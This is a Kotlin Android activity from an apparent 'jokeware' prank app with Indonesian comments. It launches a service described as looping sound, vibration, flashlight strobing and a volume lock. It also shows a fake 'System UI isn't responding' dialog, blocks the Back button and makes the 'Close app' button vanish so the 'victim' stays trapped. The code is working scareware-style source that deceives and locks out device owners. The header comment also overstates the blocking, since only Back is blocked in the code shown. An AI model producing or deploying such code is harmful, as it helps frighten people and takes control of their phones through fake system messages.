package com.jokeware.nuisance

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * MainActivity:
 * - Layar utama 100% transparan tanpa background hitam.
 * - Menahan input sentuhan (touch block) dan tombol Back/Home sehingga user terperangkap di dialog.
 * - Memunculkan Fake System Dialog ("System UI isn't responding").
 * - Tombol "Close app" saat ditekan akan menghilang (GONE), menyisakan hanya tombol "Wait".
 * - Tombol "Wait" saat ditekan mengubah teks dialog menjadi unresponsive.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var btnCloseApp: Button
    private lateinit var btnWait: Button
    private lateinit var tvDialogTitle: TextView
    private lateinit var tvDialogMessage: TextView

    companion object {
        private const val TAG = "MainActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Log.d(TAG, "onCreate: Launching transparent fake dialog overlay")

        // 1. Jalankan PrankAudioService (audio, getar looping, senter strobe, volume lock)
        val serviceIntent = Intent(this, PrankAudioService::class.java).apply {
            action = PrankAudioService.ACTION_START
        }
        ContextCompat.startForegroundService(this, serviceIntent)

        // 2. Inisialisasi View komponen
        tvDialogTitle = findViewById(R.id.tvDialogTitle)
        tvDialogMessage = findViewById(R.id.tvDialogMessage)
        btnCloseApp = findViewById(R.id.btnCloseApp)
        btnWait = findViewById(R.id.btnWait)

        // Tampilkan info model HP secara halus pada pesan dialog
        val deviceModel = Build.MODEL
        tvDialogMessage.text = "Process system on $deviceModel is not responding. Do you want to close it?"

        // 3. Blokir tombol Back bawaan HP (agar user tidak bisa keluar dengan tombol back)
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                Log.d(TAG, "Back button pressed - blocked")
                // Mengabaikan sentuhan Back agar user tetap berada di layar dialog
            }
        })

        // 4. Interaksi tombol prank
        setupPrankInteractions()
    }

    private fun setupPrankInteractions() {
        // Tombol Close App: Jika ditekan, tombol ini langsung HILANG (View.GONE)
        // sehingga korban hanya punya tombol "Wait"
        btnCloseApp.setOnClickListener {
            Log.d(TAG, "Close app clicked - hiding button")
            btnCloseApp.visibility = View.GONE
            tvDialogMessage.text = "Failed to terminate unresponsive process. Kernel lock active."
        }

        // Tombol Wait: Jika ditekan, sistem menampilkan pesan membeku
        btnWait.setOnClickListener {
            Log.d(TAG, "Wait clicked - simulating freeze")
            tvDialogTitle.text = "System UI"
            tvDialogMessage.text = "Waiting for process response... Touch input suspended."
            btnWait.isEnabled = false
        }
    }

    // Blokir event tombol hardware tertentu agar tidak memicu keluar
    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true
        }
        return super.onKeyDown(keyCode, event)
    }
}
